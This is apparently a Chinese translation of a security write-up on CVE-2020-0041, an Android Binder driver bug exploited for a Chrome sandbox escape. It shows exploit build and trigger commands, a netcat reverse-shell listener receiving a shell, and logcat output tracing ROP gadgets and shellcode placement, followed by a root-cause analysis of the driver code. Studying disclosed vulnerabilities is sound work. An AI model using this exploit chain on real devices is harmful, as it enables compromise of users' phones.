
`$ cd reverse_shell && make && cp libs / armeabi-v7a / libpayload.so ../payload.so && cd .. $ adb reverse tcp：6666 tcp：6666; python ./serve.py`

在`tcp：5555`上设置反向Shell侦听：

```
$ adb reverse tcp:5555 tcp:5555 ; nc -l -p 5555 -vv
```

使用`python`服务访问`sandbox/index.html`以触发漏洞利用。

```
$ adb reverse tcp:8080 tcp:8080 ; python -m SimpleHTTPServer 8080
```

现在，只需导航到`http：// localhost：8080 /`即可触发漏洞利用。

```
$ adb reverse tcp:5555 tcp:5555 ; nc -l -p 5555 -vv
5555
Listening on [0.0.0.0] (family 0, port 5555)
Connection from localhost 36871 received!
id
uid=10246(u0\_a246) gid=10246(u0\_a246) groups=10246(u0\_a246),3001(net\_bt\_admin),3002(net\_bt),3003(inet),9997(everybody),20246(u0\_a246\_cache),50246(all\_a246) context=u:r:untrusted\_app\_27:s0:c246,c256,c512,c768
```

该漏洞利用还会在`logcat`中使用`PWN`标签生成调试输出。要查看它，只需运行`adb logcat | grep PWN`，产生类似于以下内容的输出：

```
11-04 16:33:08.269 31606 31634 D PWN : [*] Binder mapping at 0xc97eb000
11-04 16:33:08.269 31606 31634 D PWN : [*] Found binder fd 9
11-04 16:33:08.272 31606 31634 D PWN : [*] IParentProcess handle is 5
11-04 16:33:08.275 31606 31634 D PWN : [*] Transaction size max fdeb8
11-04 16:33:08.275 31606 31634 D PWN : [*] Target user_address: c97eb148
11-04 16:33:08.276 31606 31634 D PWN : [*] Target binder offset: 64
11-04 16:33:08.276 31606 31634 D PWN : [*] Fake PTR offset: 7c
11-04 16:33:08.276 31606 31634 D PWN : [*] Valid PTR offset: a4
11-04 16:33:08.276 31606 31634 D PWN : [*] Shellcode size: 0x160
11-04 16:33:08.286 31606 31634 D PWN : [*] libc: 0xf1585000 , libc size: 0xb6000
11-04 16:33:08.289 31606 31634 D PWN : [*] Found gadget 0 at 0xf163024c
11-04 16:33:08.290 31606 31634 D PWN : [*] Found gadget 1 at 0xf15dfcdc
11-04 16:33:08.291 31606 31634 D PWN : [*] Found gadget 2 at 0xf15ce0a9
11-04 16:33:08.292 31606 31634 D PWN : [*] Found gadget 3 at 0xf15e8c6f
11-04 16:33:08.293 31606 31634 D PWN : [*] Found gadget 4 at 0xf15ee10d
11-04 16:33:08.293 31606 31634 D PWN : [*] Found gadget 5 at 0xf15ae24d
11-04 16:33:08.295 31606 31634 D PWN : [*] Found gadget 6 at 0xf160ebfc
11-04 16:33:08.297 31606 31634 D PWN : [*] Found gadget 7 at 0xf1619335
11-04 16:33:08.297 31606 31634 D PWN : [*] Found gadget 8 at 0xf15d38df
11-04 16:33:08.298 31606 31634 D PWN : [*] Found gadget 9 at 0xf15bb2b8
11-04 16:33:08.299 31606 31634 D PWN : [*] Found gadget 10 at 0xf15e4774
11-04 16:33:08.300 31606 31634 D PWN : [*] Found gadget 11 at 0xf15dfbb8
11-04 16:33:08.302 31606 31634 D PWN : [*] Handle: 0xec965cd8, open: 0xf15eb281
11-04 16:33:08.311 31606 31634 D PWN : [*] Linker mapping at 0xf39d6000, size b9000
11-04 16:33:08.311 31606 31634 D PWN : [*] Found linker dlopen: 0xf39f30b9
11-04 16:33:08.311 31606 31634 D PWN : [*] fake_object_addr: c97eb2e8
11-04 16:33:08.311 31606 31634 D PWN : [*] Register scratch space: f163b6e8
11-04 16:33:08.311 31606 31634 D PWN : [*] Final shellcode expected at c97eb658
11-04 16:33:08.311 31606 31634 D PWN : [*] Final shellcode location 30309000
11-04 16:33:08.311 31606 31634 D PWN : [*] Shellcode copy at 30308800
11-04 16:33:08.337 31606 31634 D PWN : [*] transaction return code: 0
```

可以在Blue Frost Security GitHub中找到完整漏洞利用代码，我们提供此代码作为Chromium 78.0.3904.62的一组漏洞演示。

在下一篇文章中，我们将讨论如何攻击内核执行的处理过程，以便使用此相同的bug实现将特权提升到root的权限。

原文地址：

Binder驱动程序中的漏洞已于2019年12月10日向Google报告，该漏洞已包含在[2020年3月的Android安全公告](https://bbs.kanxue.com/elink@354K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6K6L8%4g2J5j5$3g2Q4x3X3g2S2L8X3c8J5L8$3W2V1i4K6u0W2j5$3!0E0i4K6u0r3M7$3g2U0N6i4u0A6N6s2W2Q4x3V1k6T1N6h3I4D9k6i4c8A6L8W2)9J5c8U0t1H3x3U0m8Q4x3X3b7H3x3#2)9J5k6o6l9I4i4K6t1K6K9$3g2J5L8X3g2D9i4K6u0V1j5$3!0E0M7r3!0F1k6h3&6@1M7H3`.`.)（CVE-2020-0041）中，Binder的漏洞刚开始学习，通过翻译顺便学习分享一下。

在这篇文章中，将介绍此漏洞，写了两个漏洞利用方法：Chrome的沙箱逃逸利用CVE-2020-0041，从存在漏洞的渲染器攻击Chrome浏览器进行权限提升，此漏洞会危害内核并从常规的`untrusted_app`升级到`root`。

## 0x01 漏洞根本原因

该漏洞是由计算驱动程序已验证的有效偏移量时的逻辑漏洞引起的，尤其是当Binder驱动程序正在处理`transaction`时，它会经过多个偏移量，并在每个此类偏移量处验证并转换*B*inder对象。

`*BINDER_TYPE_PTR*`和`*BINDER_TYPE_FDA*`类型的对象可以具有父对象，该父对象必须是已验证的对象之一。为了验证这一点，驱动程序使用[以下代码](https://bbs.kanxue.com/elink@443K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6S2L8X3c8J5L8$3W2V1i4K6u0W2k6$3!0G2k6$3I4W2M7$3!0#2M7X3y4W2i4K6u0W2j5$3!0E0i4K6u0r3K9$3g2J5L8X3g2D9i4K6u0r3L8i4y4E0i4K6u0r3i4K6u0n7i4K6u0r3M7X3g2X3M7#2)9J5c8Y4c8S2k6%4y4Q4x3V1k6S2L8X3c8J5L8$3W2V1i4K6u0V1x3e0m8Q4x3X3f1H3i4K6u0W2x3q4)9#2k6Y4t1H3i4K6u0W2y4o6u0Q4x3V1k6V1M7X3W2$3k6i4u0K6i4K6u0r3j5h3&6V1M7X3!0A6k6q4)9J5c8X3u0A6L8X3c8W2M7W2)9J5k6h3y4Q4x3U0x3K6y4o6x3K6)：

```
 case BINDER_TYPE_FDA: {

      struct binder_object ptr_object;

      binder_size_t parent_offset;

      struct binder_fd_array_object *fda =

        to_binder_fd_array_object(hdr);

[1]     size_t num_valid = (buffer_offset - off_start_offset) *

            sizeof(binder_size_t);
      struct binder_buffer_object *parent =
        binder_validate_ptr(target_proc, t->buffer,
                &ptr_object, fda->parent,
                off_start_offset,
                &parent_offset,
                num_valid);

      /* ... */

    } break;
    case BINDER_TYPE_PTR: {
      struct binder_buffer_object *bp =
        to_binder_buffer_object(hdr);
      size_t buf_left = sg_buf_end_offset - sg_buf_offset;
      size_t num_valid;

            /* ... */
[2]     if (binder_alloc_copy_user_to_buffer(
            &target_proc->alloc,
            t->buffer,
            sg_buf_offset,
            (const void __user *)
              (uintptr_t)bp->buffer,
            bp->length)) {
        binder_user_error("%d:%d got transaction with invalid offsets ptr\n",
              proc->pid, thread->pid);
        return_error_param = -EFAULT;
        return_error = BR_FAILED_REPLY;
        return_error_line = __LINE__;
        goto err_copy_data_failed;
      }

      /* Fixup buffer pointer to target proc address space */
      bp->buffer = (uintptr_t)
        t->buffer->user_data + sg_buf_offset;
      sg_buf_offset += ALIGN(bp->length, sizeof(u64));

[3]     num_valid = (buffer_offset - off_start_offset) *
          sizeof(binder_size_t);

      ret = binder_fixup_parent(t, thread, bp,
              off_start_offset,
              num_valid,
              last_fixup_obj_off,
              last_fixup_min_off);
```

*[1]*和*[3]*处的`*num_valid*`计算不正确，因为与`*sizeof（binder_size_t）*`的乘积应改为除法，由于该漏洞，可以提供越界偏移作为`PTR`或`FDA`对象的父对象。

有趣的是，此漏洞仅在 `transaction`的发送路径期间发生，而在清除代码中正确计算了相同的值。

## 0x02 破坏transaction

即使越界对象存在偏移，但仍可以使用`*bind_validate_ptr*`和/或`*binder_validate_fixup*`函数验证父对象，然后使用它们，因此，不可能直接提供完全任意的对象。

我们可以利用以下事实：在偏移量数组之后是 `transaction`缓冲区中的*额外缓冲区*或`*sg_buf*`，并且当遇到`*BINDER_TYPE_PTR*`时，*会将*这些缓冲区复制到其中（以上代码片段中的*[2]*）。

基于此，如果我们在复制相应的`*sg_buf*`数据之前使用越界偏移，则该数据将未初始化并从先前执行的 `transaction`中获取。但是，如果在复制相应的`*sg_buf*`之后使用了越界偏移量，则将从新复制的数据中获取偏移量。
